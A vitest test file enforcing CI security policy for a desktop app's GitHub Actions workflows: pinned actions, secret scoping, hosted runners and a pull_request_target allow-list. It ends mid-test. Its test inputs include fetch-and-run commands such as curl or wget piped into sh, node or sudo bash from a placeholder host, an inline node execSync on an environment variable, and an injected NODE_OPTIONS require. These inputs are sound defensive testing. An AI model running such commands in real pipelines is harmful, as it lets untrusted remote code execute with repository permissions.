import { existsSync, readdirSync, statSync } from "node:fs";
import { createRequire } from "node:module";
import { resolve } from "node:path";
import { describe, expect, it } from "vitest";
import { parse as parseYaml, stringify as stringifyYaml } from "yaml";
import { readRepoFile } from "./test-helpers.js";
import {
  TRUSTED_EVENTS,
  PULL_REQUEST_TARGET_WORKFLOWS,
  pullRequestTargetAllowListViolations,
  pullRequestTargetExecutedFiles,
  workflowEvents,
  workflowRunnerViolations,
} from "./support/workflow-runner-policy.js";
import { assertReleaseSecretEnvironments } from "./support/workflow-secret-policy.js";
import { jobRunCommands, workflowJobs } from "./support/workflow-source.js";

/** A repository script module, loaded as the gate loads it. */
const requireFromRepo = (path: string): unknown => createRequire(import.meta.url)(`../../${path}`);

const root = process.cwd();

/** True when `marker` appears in `command` as a whole name rather than as the
 *  prefix or suffix of a longer one. `bun run test` runs the suite;
 *  `bun run test:knip-gate` is a hygiene gate, and `String.includes` reads the
 *  first inside the second. A name ends where a character outside the class
 *  below begins. `.` is outside it deliberately: the file spellings are written
 *  without an extension, so `check-knip-baseline` has to match inside
 *  `scripts/check-knip-baseline.mjs`. */
const NAME_CHARACTER = /[A-Za-z0-9_:-]/u;

function mentions(command: string, marker: string): boolean {
  for (let from = 0; ; from += 1) {
    const at = command.indexOf(marker, from);
    if (at < 0) return false;
    const before = at === 0 ? "" : (command[at - 1] as string);
    const after = command[at + marker.length] ?? "";
    if (!NAME_CHARACTER.test(before) && !NAME_CHARACTER.test(after)) return true;
    from = at;
  }
}

/** Every gate that inspects the repository's own bookkeeping — a manifest, a
 *  baseline ledger, the self-test of a gate that reads one. A failure says a
 *  file is stale, never that the product is broken.
 *
 *  Both spellings for every gate: the package.json script name, and the base
 *  name of the script file that name resolves to. The asymmetry is the failure
 *  mode. A list holding `check:knip` but not `check-knip-baseline` waves
 *  through `node scripts/check-knip-baseline.mjs`, which is the same gate under
 *  a name package.json already contains — so "the list cannot see a name nobody
 *  has written yet" would understate it. "keeps each gate's two spellings in
 *  step with package.json" below fails when a rename leaves a pair stale.
 *
 *  A gate genuinely new to the repository still has to be added here by hand. */
const HYGIENE_GATES: ReadonlyArray<{ script: string; file: string }> = [
  { script: "check:knip", file: "check-knip-baseline" },
  { script: "check:knip:self-test", file: "check-knip-gate-self-test" },
  { script: "test:knip-gate", file: "knip-baseline.test" },
  { script: "check:test-duplicates", file: "check-test-duplicates" },
  { script: "check:sunset-inventory", file: "check-sunset-inventory" },
  { script: "check:sot-shapes", file: "check-sot-shapes" },
];

/** The composite both ci.yml and the pre-push hook call, so the two gate
 *  inventories cannot drift. Its members are pinned by "keeps check:gate-core
 *  in step with its callers" below; a workflow step that names the composite
 *  counts as naming every member. */
const HYGIENE_COMPOSITE = {
  script: "check:gate-core",
  members: ["check:knip", "check:test-duplicates", "check:sunset-inventory", "check:sot-shapes"],
} as const;

const REPOSITORY_HYGIENE = [
  ...HYGIENE_GATES.flatMap(({ script, file }) => [script, file]),
  HYGIENE_COMPOSITE.script,
];

const HYGIENE_SCRIPTS = new Set([
  ...HYGIENE_GATES.map(({ script }) => script),
  HYGIENE_COMPOSITE.script,
]);

const packageScripts = (
  JSON.parse(readRepoFile("package.json")) as {
    scripts: Record<string, string>;
  }
).scripts;

/** The shape of a package.json script that compiles, builds, or runs the
 *  product: `typecheck`, `build`, `test`, and anything under `build:` or
 *  `test:`. */
const VERIFICATION_SCRIPT_SHAPE = /^(?:typecheck|build|test)(?::|$)/u;

/** Scripts that verify but whose names do not carry that shape, each with the
 *  file its body resolves to. Both spellings, for the same reason
 *  HYGIENE_GATES keeps both, and "keeps the verification list in step with
 *  package.json" below checks the pair against package.json. */
const VERIFICATION_CHECKS: ReadonlyArray<{ script: string; file: string }> = [
  { script: "check:mxc-packaging", file: "check-mxc-packaging" },
  { script: "check:mxc-pins", file: "update-mxc-pins" },
  { script: "check:typecheck-tests", file: "check-test-typecheck-baseline" },
  {
    script: "check:typecheck-tests:self-test",
    file: "check-test-typecheck-gate-self-test",
  },
  { script: "check:test-coverage", file: "run-test-coverage-gate" },
];

/** Compile and test invocations that reach the tool without going through
 *  package.json. Unlike the two lists above this one is written by hand and
 *  has a gap that no test closes: a workflow that compiles by calling some
 *  other tool directly, under a spelling nobody has written here, is not
 *  recognised, and the ordering invariant would let a hygiene gate precede it.
 *  `tsc --noEmit` is `bun run typecheck`'s body and is listed so a workflow
 *  inlining it is still seen. No workflow calls `playwright test` today; it
 *  stays listed so a workflow that adds the Playwright suite back is still
 *  recognised as a verification step. */
const DIRECT_TOOL_INVOCATIONS = ["tsc --noEmit", "playwright test"];

/** Names that appear only in a step which compiles, builds, or executes the
 *  product. The ordering invariant below is "no hygiene gate before one of
 *  these", so a step this list cannot see is a step a hygiene gate may legally
 *  precede.
 *
 *  Exhaustive over package.json, not over every possible spelling. The first
 *  half is derived — every script matching VERIFICATION_SCRIPT_SHAPE that
 *  HYGIENE_GATES does not claim — so a new `build:*` or `test:*` script joins
 *  it with no edit here. That derivation replaced a hand list that package.json
 *  had already outgrown: the hand list held thirteen names, and of the
 *  twenty-six package.json scripts carrying this shape it left twenty
 *  unrecognised — `build:main` and `test:coverage` among them — so a workflow
 *  step calling one of those was a step a hygiene gate could legally precede.
 *  The remaining halves are hand-written; DIRECT_TOOL_INVOCATIONS states the
 *  gap that leaves. */
const VERIFIES_THE_CODE = [
  ...Object.keys(packageScripts)
    .filter(
      (name) =>
        VERIFICATION_SCRIPT_SHAPE.test(name) && !HYGIENE_SCRIPTS.has(name),
    )
    .map((name) => `bun run ${name}`),
  ...VERIFICATION_CHECKS.flatMap(({ script, file }) => [script, file]),
  ...DIRECT_TOOL_INVOCATIONS,
].sort();

function matched(commands: string[], markers: string[]): string[] {
  return markers.filter((marker) =>
    commands.some((command) => mentions(command, marker))
  );
}

function firstCommandIndex(commands: string[], markers: string[]): number {
  return commands.findIndex((command) =>
    markers.some((marker) => mentions(command, marker))
  );
}

function lastCommandIndex(commands: string[], markers: string[]): number {
  for (let index = commands.length - 1; index >= 0; index -= 1) {
    const command = commands[index] as string;
    if (markers.some((marker) => mentions(command, marker))) return index;
  }
  return -1;
}

function workflowFileNames(): string[] {
  return readdirSync(resolve(root, ".github/workflows"))
    .filter((entry) => /\.ya?ml$/u.test(entry))
    .sort();
}

/**
 * The workflow file is the single source of each reviewed pin (Dependabot
 * bumps it there); these guards assert only its shape: the action is used at
 * a full commit SHA with a version comment, never a floating tag.
 */
function expectPinnedAction(source: string, action: string): void {
  const escaped = action.replace(/[.*+?^${}()|[\]\\/]/gu, "\\$&");
  expect(source, `${action} must be used at a full commit SHA with a version comment`).toMatch(
    new RegExp(`uses:\\s+${escaped}@[0-9a-f]{40}\\s+#\\s+v\\d+(?:\\.\\d+)*\\s*$`, "mu"),
  );
}

describe("installer smoke and packaging discipline", () => {
  it("requires the audio runtime in Linux installer dependencies", () => {
    const packageJson = JSON.parse(readRepoFile("package.json")) as {
      build?: {
        deb?: { depends?: string[] };
        rpm?: { depends?: string[] };
      };
    };

    expect(packageJson.build?.deb?.depends).toEqual([
      "libgtk-3-0",
      "libnotify4",
      "libnss3",
      "libxss1",
      "libxtst6",
      "xdg-utils",
      "libatspi2.0-0",
      "libuuid1",
      "libsecret-1-0",
      "libasound2t64 | libasound2",
    ]);
    expect(packageJson.build?.rpm?.depends).toEqual([
      "gtk3",
      "libnotify",
      "nss",
      "libXScrnSaver",
      "(libXtst or libXtst6)",
      "xdg-utils",
      "at-spi2-core",
      "(libuuid or libuuid1)",
      "alsa-lib",
    ]);
  });

  it("keeps the unsigned-build input and the single pinned release publisher", () => {
    const workflow = readRepoFile(".github/workflows/build-installers.yml");

    expect(workflow).toContain("skip_code_sign:");
    expect(workflow).toContain("publish-release:");
    expectPinnedAction(workflow, "softprops/action-gh-release");
  });

  it("keeps the disposable installer scope on the static hosted matrix", () => {
    const workflow = readRepoFile(".github/workflows/build-installers.yml");
    const parsed = parseYaml(workflow) as {
      on: { workflow_dispatch: { inputs: { installer_scope: { default: string; options: string[] } } } };
    };
    expect(parsed.on.workflow_dispatch.inputs.installer_scope).toMatchObject({
      default: "all",
      options: ["all", "windows-disposable"],
    });
    // Every installer entry already runs on a disposable hosted image
    // (workflow-runner-policy.ts needs a statically readable matrix), so the
    // scope does not compute the matrix: it only keeps the build unsigned and
    // unpublished, asserted in the next test.
    const jobs = workflowJobs(workflow);
    const installers = jobs.get("installers");
    const profile = jobs.get("release-profile");
    if (installers === undefined || profile === undefined) throw new Error("missing installers or release-profile job");
    expect(installers).not.toContain("needs.release-profile.outputs");
    expect(profile).not.toMatch(/^ {4}outputs:$/mu);
    expect(workflow).not.toContain("vars.AVE_");
  });

  it("keeps disposable Windows validation unsigned and outside release publication", () => {
    const jobs = workflowJobs(readRepoFile(".github/workflows/build-installers.yml"));
    const installers = jobs.get("installers");
    if (installers === undefined) throw new Error("missing installers job");
    expect(installers).toContain("if: github.event_name == 'push' || inputs.installer_scope == 'windows-disposable' || inputs.contract_probe != 'true'");
    const build = jobRunCommands(installers).find((command) => command.includes('args=("--${{ matrix.target }}")'));
    if (build === undefined) throw new Error("missing installer build command");
    expect(build.split("elif")[0]).toContain('if [ "${{ inputs.installer_scope }}" = "windows-disposable" ]; then');
    expect(build.split("elif")[0]).toContain('args+=("--skip-code-sign" "--publish" "never")');
    expect(build.split("elif")[0]).toContain('echo "skip_sign=true" >> "$GITHUB_OUTPUT"');
    for (const id of ["publish-release", "publish-r2"]) {
      expect(jobs.get(id)).toMatch(/^ {4}if: github\.event_name == 'push'$/mu);
    }
    expect(jobs.get("publish-contract")).toContain("inputs.installer_scope != 'windows-disposable'");
    // Every installer job runs on a disposable hosted image, so the Windows
    // smoke is authorized by target alone; no runner.environment branch.
    expect(installers).toContain("AVE_ALLOW_DISPOSABLE_WINDOWS_INSTALLER_SMOKE: ${{ matrix.target == 'win' && '1' || '' }}");
  });

  it("smoke-launches the packaged app before uploading installer artifacts", () => {
    const workflow = readRepoFile(".github/workflows/build-installers.yml");
    const smokeScript = readRepoFile("scripts/smoke-packaged-app.mjs");

    expect(workflow).toContain("Smoke launch packaged app");
    expect(workflow).toContain("scripts/smoke-packaged-app.mjs --target");
    expect(workflow).toContain("xvfb-run -a");
    expect(workflow).toContain("x86_64) tools+=(xvfb-run:xvfb dbus-run-session:dbus dbus-launch:dbus-x11 gnome-keyring-daemon:gnome-keyring) ;;");
    expect(workflow).toContain('sudo apt-get install -y --no-install-recommends --no-upgrade "${missing[@]}"');
    expect(workflow).toContain("dbus-run-session -- bash -euo pipefail -c");
    expect(workflow).toContain("gnome-keyring-daemon --unlock --components=secrets");
    expectPinnedAction(workflow, "actions/cache");
    // Bun's package cache lives in the workspace, never the runner user's
    // ~/.bun (on a self-hosted runner, the owner's own cache).
    expect(workflow).toContain("BUN_INSTALL_CACHE_DIR: ${{ github.workspace }}/.cache/bun");
    expect(workflow).toContain("            .cache/bun\n");
    expect(workflow).not.toContain("~/.bun");
    expect(workflow).toContain("ELECTRON_BUILDER_CACHE");
    expect(workflow).toContain("--skip-native-rebuild");
    expect(workflow.indexOf("Smoke launch packaged app")).toBeLessThan(workflow.indexOf("Upload installers"));

    expect(smokeScript).toContain("ERR_MODULE_NOT_FOUND");
    expect(smokeScript).toContain("Cannot find package");
    // Executable discovery is shared with the packaged escape gate, so both
    // launch the same binary.
    const selection = readRepoFile("scripts/lib/packaged-executable-selection.mjs");
    expect(smokeScript).toContain('import { findPackagedExecutable } from "./lib/packaged-executable-selection.mjs"');
    expect(selection).toContain("export function findPackagedExecutable(target, releaseDir)");
    expect(selection).toContain("linux-unpacked");
    expect(selection).toContain("/^linux-.+-unpacked$/u");
    expect(selection).toContain("linuxExecutablePreferenceSuffixes(process.arch, sep)");
    expect(selection).toContain("pickBestByExactSuffix");
    expect(selection).toContain("win-unpacked");
    expect(selection).toContain(".app");
    expect(smokeScript).toContain("AVE_HOME");
    expect(smokeScript).toContain('process.platform === "win32" ? tmpdir() : "/tmp"');
    expect(smokeScript).toContain("--password-store=gnome-libsecret");
    expect(smokeScript).toContain("snapshotProductionLogs(env.AVE_HOME)");
    expect(smokeScript).toContain("readProductionLogsSince(env.AVE_HOME, logSnapshot)");
    expect(smokeScript).toContain("launchSucceeded({ ready, timedOut, code, signal })");
    expect(smokeScript).toContain('runPackagedAppOnce(executable, timeoutMs, env, "first launch")');
    expect(smokeScript).toContain('runPackagedAppOnce(executable, timeoutMs, env, "upgrade probe")');
    expect(smokeScript).toContain("assertPackagedFirstLaunchSeed");
    expect(smokeScript).toContain("assertUpgradeProbe");
    expect(smokeScript).toContain("expectedSeededMarkdownFiles");
    expect(smokeScript).toContain('join(root, "resources", subdir)');
    expect(smokeScript).toContain('["agents", "skills", "prompts"]');
    expect(smokeScript).toContain("skills");
    expect(smokeScript).toContain("prompts");
  });

  it("runs the packaged escape gate on the built app before uploading installer artifacts", () => {
    const workflow = readRepoFile(".github/workflows/build-installers.yml");
    const gate = readRepoFile("scripts/packaged-escape-gate.mjs");

    expect(workflow).toContain("Packaged escape gate");
    expect(workflow).toContain("xvfb-run -a node scripts/packaged-escape-gate.mjs --target linux");
    expect(workflow).toContain('node scripts/packaged-escape-gate.mjs --target "${{ matrix.target }}"');
    expect(workflow.indexOf("Smoke launch packaged app")).toBeLessThan(workflow.indexOf("Packaged escape gate"));
    expect(workflow.indexOf("Packaged escape gate")).toBeLessThan(workflow.indexOf("Upload installers"));

    // The probes run as the plugin child does; the control is the packaged
    // application's own main process, never the development helper.
    expect(gate).toContain('ELECTRON_RUN_AS_NODE: "1"');
    expect(gate).toContain("electron.launch({ executablePath: executable");
    expect(gate).toContain("app.evaluate(");
    expect(gate).toContain("prepareElectronLaunchEnv(");
    expect(gate).toContain("--user-data-dir=");
    expect(gate).toContain("AVE_HOME");
    expect(gate).toContain('import { findPackagedExecutable } from "./lib/packaged-executable-selection.mjs"');
    // Named in its comment to say why; never a path it runs.
    expect(gate).not.toContain('"control-electron-main.cjs"');
    // Its environment is its own allow-list, not another harness's launcher.
    expect(gate).toContain('import { packagedEscapeGateEnvironment } from "./lib/packaged-escape-gate-environment.mjs"');
    expect(gate).not.toMatch(/a2a-p4-5|buildPackagedUiEnvironment|AVE_A2A_/);
  });

  it("hands the packaged executable only the gate's own environment allow-list", () => {
    const { packagedEscapeGateEnvironment } = requireFromRepo("scripts/lib/packaged-escape-gate-environment.mjs") as {
      packagedEscapeGateEnvironment: (source: NodeJS.ProcessEnv) => Record<string, string>;
    };
    // A source that answers every name: what comes back is the allow-list
    // itself, so a key added to it or dropped from it fails here.
    const everything = new Proxy({}, { get: (_, key) => (typeof key === "string" ? `value-of-${key}` : undefined) });
    expect(Object.keys(packagedEscapeGateEnvironment(everything as NodeJS.ProcessEnv))).toEqual([
      "PATH", "HOME", "USER", "LOGNAME", "SHELL", "LANG", "LC_ALL",
      "TMPDIR", "TEMP", "TMP", "USERPROFILE", "SystemRoot", "WINDIR",
      "ComSpec", "PATHEXT", "APPDATA", "LOCALAPPDATA",
      "DISPLAY", "WAYLAND_DISPLAY", "XAUTHORITY", "XDG_RUNTIME_DIR",
      "XDG_CONFIG_HOME", "XDG_DATA_HOME", "XDG_CACHE_HOME",
      "DBUS_SESSION_BUS_ADDRESS",
    ]);
    // Each half of the gate sets ELECTRON_RUN_AS_NODE itself; nothing of a
    // runner's credentials, evidence keys or Node options rides along, and a
    // variable the source does not carry is not invented.
    expect(
      packagedEscapeGateEnvironment({
        PATH: "/usr/bin",
        DISPLAY: ":99",
        ELECTRON_RUN_AS_NODE: "1",
        NODE_OPTIONS: "--require /tmp/x.js",
        GITHUB_TOKEN: "t",
        AVE_A2A_EVIDENCE_PUBLIC_KEY_FILE: "/k",
        AVE_A2A_EVIDENCE_SIGNER_SHA256: "s",
      }),
    ).toEqual({ PATH: "/usr/bin", DISPLAY: ":99" });
  });

  it("refuses to build or attach release assets from a repository package.json does not publish to", () => {
    const jobs = workflowJobs(readRepoFile(".github/workflows/build-installers.yml"));
    const gate = "node scripts/check-release-repository.mjs";

    /** The one step in `body` that runs the gate, held to an exact shape: the
     *  run block is the gate and nothing else, so `|| true`, `|| :`,
     *  `set +e` or any other way to swallow its exit status fails here. */
    function gateStep(id: string): string {
      const body = jobs.get(id);
      if (body === undefined) throw new Error(`build-installers.yml has no ${id} job`);
      expect(jobRunCommands(body).filter((command) => command.includes(gate)), id).toEqual([
        `set -euo pipefail\n${gate}`,
      ]);
      const at = body.indexOf(gate);
      const step = body.slice(body.lastIndexOf("\n      - ", at), body.indexOf("\n      - ", at));
      expect(step, id).toContain("\n        shell: bash\n");
      expect(step, id).not.toContain("continue-on-error");
      expect(body.indexOf("uses: actions/checkout@"), id).toBeLessThan(at);
      return step;
    }

    // Before the installer matrix: tag builds only, like the tag checks beside it.
    const profile = gateStep("release-profile");
    expect(profile.match(/^\s+if:.*$/gmu)).toEqual(["        if: github.event_name == 'push'"]);
    expect(jobs.get("installers")).toMatch(/^ {4}needs: release-profile$/mu);

    // Before anything is downloaded or attached: unconditional.
    const publishStep = gateStep("publish-release");
    expect(publishStep).not.toMatch(/^\s+if:/mu);
    const publish = jobs.get("publish-release") as string;
    expect(publish.indexOf(gate)).toBeLessThan(publish.indexOf("uses: actions/download-artifact@"));
    expect(publish.indexOf(gate)).toBeLessThan(publish.indexOf("uses: softprops/action-gh-release@"));

    const r2Step = gateStep("publish-r2");
    expect(r2Step).not.toMatch(/^\s+if:/mu);
    const r2 = jobs.get("publish-r2") as string;
    expect(r2.indexOf(gate)).toBeLessThan(r2.indexOf("uses: actions/download-artifact@"));
    expect(r2.indexOf(gate)).toBeLessThan(r2.indexOf("node scripts/upload-release-r2.mjs"));
  });

  it("publishes tag builds to the R2 release channel with every secret required", () => {
    const jobs = workflowJobs(readRepoFile(".github/workflows/build-installers.yml"));
    const r2 = jobs.get("publish-r2");
    if (r2 === undefined) throw new Error("build-installers.yml has no publish-r2 job");

    // Tag builds only, after the profile and every installer, like
    // publish-release, and never behind the GitHub Release draft.
    expect(r2).toMatch(/^ {4}needs: \[release-profile, installers\]$/mu);
    expect(r2).toMatch(/^ {4}if: github\.event_name == 'push'$/mu);
    expect(r2).toMatch(/^ {6}contents: read$/mu);
    expect(r2).not.toContain("continue-on-error");
    expectPinnedAction(r2, "actions/download-artifact");
    expect(r2).toContain("pattern: ave-*-installers");

    // The plan is printed with no secret in scope, then the upload runs with
    // all four; the script refuses a missing one rather than skipping.
    const commands = jobRunCommands(r2)
      .filter((command) => command.includes("scripts/upload-release-r2.mjs"))
      .map((command) => command.trimEnd());
    expect(commands).toEqual([
      'set -euo pipefail\nnode scripts/upload-release-r2.mjs --dir release-staging --tag "$RELEASE_TAG" --dry-run',
      'set -euo pipefail\naws --version\nnode scripts/upload-release-r2.mjs --dir release-staging --tag "$RELEASE_TAG"',
    ]);
    const uploadAt = r2.indexOf("- name: Upload to R2");
    expect(uploadAt).toBeGreaterThan(r2.indexOf("- name: Plan the R2 upload"));
    for (const name of ["R2_ACCOUNT_ID", "R2_ACCESS_KEY_ID", "R2_SECRET_ACCESS_KEY", "R2_BUCKET"]) {
      expect(r2.slice(uploadAt)).toContain(`${name}: \${{ secrets.${name} }}`);
    }
    expect(r2.slice(0, uploadAt)).not.toContain("secrets.");
  });

  it("confines every release-bucket secret reader to the release environment", () => {
    for (const name of workflowFileNames()) {
      assertReleaseSecretEnvironments(readRepoFile(`.github/workflows/${name}`), name);
    }
  });

  it("runs every workflow job on a hosted runner and keeps fork-triggered jobs away from write tokens", () => {
    const violations = workflowFileNames()
      .flatMap((name) => workflowRunnerViolations(readRepoFile(`.github/workflows/${name}`), name));
    expect(violations).toEqual([]);
    // The fork rules are read, not vacuous: these workflows are fork-reachable.
    const reachable = workflowFileNames().filter((name) => {
      const { on } = parseYaml(readRepoFile(`.github/workflows/${name}`)) as { on: unknown };
      return workflowEvents(on).some((event) => !TRUSTED_EVENTS.has(event));
    });
    expect(reachable).toEqual(["ci.yml", "cluster-detector.yml", "codeql.yml", "naming-gate.yml", "web-ci.yml"]);
  });

  /** A repository file's content, or undefined when the path is no file. */
  const repoFile = (path: string): string | undefined => {
    const absolute = resolve(root, path);
    return existsSync(absolute) && statSync(absolute).isFile() ? readRepoFile(path) : undefined;
  };
  const allowListWhy = "pull_request_target runs with base-repo permissions; update the allow-list "
    + "(PULL_REQUEST_TARGET_WORKFLOWS in workflow-runner-policy.ts) only after a security review";

  it("pins every pull_request_target workflow, and every file it executes, to a reviewed allow-list entry", () => {
    const names = workflowFileNames();
    const violations = names.flatMap((name) =>
      pullRequestTargetAllowListViolations(readRepoFile(`.github/workflows/${name}`), name, repoFile));
    expect(violations).toEqual([]);
    // The list is exact: every entry is a workflow that exists and runs on
    // pull_request_target, so a removed or retriggered one leaves no stale pin.
    const targets = names.filter((name) => {
      const { on } = parseYaml(readRepoFile(`.github/workflows/${name}`)) as { on: unknown };
      return workflowEvents(on).includes("pull_request_target");
    });
    expect(Object.keys(PULL_REQUEST_TARGET_WORKFLOWS).sort()).toEqual(targets);
    expect(targets).toEqual(["cluster-detector.yml"]);
    // The derivation is read, not vacuous: the scope script the workflow runs
    // from its .cluster-policy checkout, and the module that script imports.
    expect(pullRequestTargetExecutedFiles(
      "cluster-detector.yml",
      readRepoFile(".github/workflows/cluster-detector.yml"),
      repoFile,
    ).files).toEqual([
      ".github/workflows/cluster-detector.yml",
      "scripts/check-cluster-scope.mjs",
      "scripts/check-cluster-sensitive-paths.mjs",
    ]);
  });

  it("refuses an edited or unlisted pull_request_target workflow until the allow-list is updated", () => {
    const cluster = readRepoFile(".github/workflows/cluster-detector.yml");
    const edited = cluster.replace("CLUSTER_THRESHOLD=3", "CLUSTER_THRESHOLD=4");
    expect(edited).not.toBe(cluster);
    const [changed, ...rest] = pullRequestTargetAllowListViolations(edited, "cluster-detector.yml", repoFile);
    expect(rest).toEqual([]);
    expect(changed).toMatch(/^\.github\/workflows\/cluster-detector\.yml changed since its pull_request_target review of cluster-detector\.yml \(sha256 [0-9a-f]{64}, allow-list [0-9a-f]{64}\): /u);
    expect(changed?.endsWith(allowListWhy)).toBe(true);
    // Line endings alone are not an edit: a Windows checkout reads CRLF.
    expect(pullRequestTargetAllowListViolations(cluster.replace(/\n/gu, "\r\n"), "cluster-detector.yml", repoFile))
      .toEqual([]);
    expect(pullRequestTargetAllowListViolations(cluster, "copy.yml", repoFile))
      .toEqual([`copy.yml is not on the pull_request_target allow-list: ${allowListWhy}`]);
    expect(pullRequestTargetAllowListViolations(cluster.replace("pull_request_target:", "pull_request:"), "copy.yml", repoFile))
      .toEqual([]);
  });

  describe("files a pull_request_target workflow executes", () => {
    const cluster = readRepoFile(".github/workflows/cluster-detector.yml");
    const withFile = (path: string, content: string) => (candidate: string): string | undefined =>
      (candidate === path ? content : repoFile(candidate));

    it.each([
      ["the scope script it runs", "scripts/check-cluster-scope.mjs"],
      ["the module that script imports", "scripts/check-cluster-sensitive-paths.mjs"],
    ])("refuses an edit to %s without a re-pin", (_label, path) => {
      const edited = `${repoFile(path) as string}\n// edited\n`;
      const violations = pullRequestTargetAllowListViolations(cluster, "cluster-detector.yml", withFile(path, edited));
      expect(violations).toHaveLength(1);
      expect(violations[0]).toMatch(new RegExp(`^${path.replace(/\./gu, "\\.")} changed since its pull_request_target review of cluster-detector\\.yml `, "u"));
      expect(violations[0]?.endsWith(allowListWhy)).toBe(true);
    });

    it("refuses a new import that the allow-list does not pin", () => {
      const path = "scripts/check-cluster-sensitive-paths.mjs";
      const edited = `import { errorMessage } from "./lib/error-message.mjs";\n${repoFile(path) as string}`;
      const read = (candidate: string) => (candidate === "scripts/lib/error-message.mjs" ? "export {};\n" : withFile(path, edited)(candidate));
      const violations = pullRequestTargetAllowListViolations(cluster, "cluster-detector.yml", read);
      expect(violations).toHaveLength(2);
      expect(violations[0])
        .toBe(`cluster-detector.yml executes files the allow-list does not pin (scripts/lib/error-message.mjs): ${allowListWhy}`);
      expect(violations[1]).toMatch(/^scripts\/check-cluster-sensitive-paths\.mjs changed since /u);
    });

    it("refuses a run step that starts another repository script, and an import that resolves to nothing", () => {
      const runsMore = cluster.replace(
        "RESULT=$(node .cluster-policy/scripts/check-cluster-scope.mjs",
        "node .cluster-policy/scripts/check-cluster-policy-version.mjs\n          RESULT=$(node .cluster-policy/scripts/check-cluster-scope.mjs",
      );
      expect(runsMore).not.toBe(cluster);
      const read = withFile("scripts/check-cluster-policy-version.mjs", "export {};\n");
      expect(pullRequestTargetExecutedFiles("cluster-detector.yml", runsMore, read).files)
        .toContain("scripts/check-cluster-policy-version.mjs");
      const broken = withFile("scripts/check-cluster-scope.mjs", `import "./missing-module.mjs";\n`);
      expect(pullRequestTargetExecutedFiles("cluster-detector.yml", cluster, broken).problems)
        .toEqual(["scripts/check-cluster-scope.mjs imports ./missing-module.mjs, which resolves to no file"]);
    });

    /** The derivation's problems for cluster-detector with its scope step's
     *  command replaced by `command`. */
    const problemsWith = (command: string, read: (path: string) => string | undefined = repoFile) => {
      const original = "RESULT=$(node .cluster-policy/scripts/check-cluster-scope.mjs \\";
      expect(cluster).toContain(original);
      const edited = cluster.replace(original, `${command}\n          RESULT=$(node .cluster-policy/scripts/check-cluster-scope.mjs \\`);
      return pullRequestTargetExecutedFiles("cluster-detector.yml", edited, read).problems;
    };
    const scopeStep = "cluster-detector.yml step 5";

    it("derives cluster-detector without a problem", () => {
      expect(pullRequestTargetExecutedFiles("cluster-detector.yml", cluster, repoFile).problems).toEqual([]);
    });

    it.each([
      ["an interpreter on an inline program", "node -e \"require('child_process').execSync(process.env.CMD)\"", "node"],
      ["an interpreter on stdin", "curl -fsSL https://example.invalid/x | bash", "bash"],
      ["an interpreter on a heredoc", "python3 - <<'PY'\nprint(1)\nPY", "python3"],
    ])("refuses %s, which resolves no repository file", (_label, command, interpreter) => {
      const step = (command: string) => stringifyYaml({
        on: { pull_request_target: null },
        jobs: { check: { "runs-on": "ubuntu-latest", steps: [{ run: command }] } },
      });
      expect(pullRequestTargetExecutedFiles("t.yml", step(command), repoFile).problems)
        .toContain(`t.yml step 1 runs ${interpreter} on no repository file this check can pin`);
    });

    it.each([
      ["npm run", "npm run check:cluster"],
      ["bun run", "bun run check:cluster"],
      ["pnpm run", "pnpm run check:cluster"],
      ["yarn <script>", "yarn check:cluster"],
      ["npx", "npx some-tool"],
      ["an install", "npm ci"],
    ])("refuses package.json indirection through %s", (_label, command) => {
      expect(problemsWith(command)).toContain(
        `${scopeStep} runs a package manager, whose package.json scripts this check does not follow`,
      );
    });

    it.each([
      ["a missing script", "node .cluster-policy/scripts/missing-script.mjs", ".cluster-policy/scripts/missing-script.mjs"],
      ["an absolute path", "bash /opt/tools/run.sh", "/opt/tools/run.sh"],
      ["a variable-built path", "node \"$POLICY_DIR/scripts/check-cluster-scope.mjs\"", "$POLICY_DIR/scripts/check-cluster-scope.mjs"],
    ])("refuses %s with a script extension", (_label, command, token) => {
      expect(problemsWith(command)).toContain(`${scopeStep} names ${token}, which does not resolve to a repository file`);
    });

    it.each([
      ["$GITHUB_WORKSPACE", "node \"$GITHUB_WORKSPACE/scripts/check-cluster-sensitive-paths.mjs\""],
      ["${{ github.workspace }}", "node ${{ github.workspace }}/scripts/check-cluster-sensitive-paths.mjs"],
    ])("resolves a path under %s to the repository root", (_label, command) => {
      expect(problemsWith(command)).toEqual([]);
    });

    it.each([
      ["a template-literal import", "const mod = await import(`./${name}.mjs`);"],
      ["a computed require", "const mod = require(process.env.MODULE);"],
      ["node spawned on a script", "spawnSync(\"node\", [scriptPath]);"],
      ["this Node spawned on a script", "execFileSync(process.execPath, [scriptPath]);"],
      ["fork", "fork(scriptPath);"],
    ])("refuses %s inside a pinned module", (_label, code) => {
      const path = "scripts/check-cluster-sensitive-paths.mjs";
      const read = withFile(path, `${repoFile(path) as string}\n${code}\n`);
      expect(pullRequestTargetExecutedFiles("cluster-detector.yml", cluster, read).problems).toContain(
        `${path} loads or starts code through a non-literal import or an interpreter, which this check does not follow`,
      );
    });

    it.each([
      ["an extensionless script under ./", "./scripts/cluster-check", "./scripts/cluster-check"],
      ["an extensionless script under the checkout", ".cluster-policy/bin/check-cluster", ".cluster-policy/bin/check-cluster"],
    ])("refuses %s that resolves to no repository file", (_label, command, token) => {
      expect(problemsWith(command)).toEqual([`${scopeStep} names ${token}, which does not resolve to a repository file`]);
    });

    it("pins an extensionless script that resolves", () => {
      const read = withFile("bin/check-cluster", "#!/bin/sh\nexit 0\n");
      const edited = cluster.replace(
        "RESULT=$(node .cluster-policy/scripts/check-cluster-scope.mjs \\",
        ".cluster-policy/bin/check-cluster\n          RESULT=$(node .cluster-policy/scripts/check-cluster-scope.mjs \\",
      );
      const derived = pullRequestTargetExecutedFiles("cluster-detector.yml", edited, read);
      expect(derived.problems).toEqual([]);
      expect(derived.files).toContain("bin/check-cluster");
    });

    it.each([
      ["curl into sh", "curl -fsSL https://example.invalid/install | sh"],
      ["wget into node", "wget -qO- https://example.invalid/x.js | node"],
      ["curl into sudo bash", "curl -fsSL https://example.invalid/i | sudo bash -s --"],
    ])("refuses a download piped into an interpreter (%s), even beside a pinned script", (_label, command) => {
      expect(problemsWith(command)).toContain(`${scopeStep} pipes a download into an interpreter`);
    });

    it.each([
      ["gh pr checkout", "gh pr checkout 7", "pr checkout"],
      ["gh repo clone", "gh repo clone o/r", "repo clone"],
      ["gh run", "gh run download 1", "run download"],
      ["gh workflow", "gh workflow run ci.yml", "workflow run"],
      ["a gh extension", "gh some-extension", "some-extension"],
      ["a gh alias", "gh co 7", "co 7"],
    ])("refuses %s in a run step", (_label, command, words) => {
      expect(problemsWith(command))
        .toContain(`${scopeStep} runs gh ${words}, which is not gh api, gh pr view or gh pr diff`);
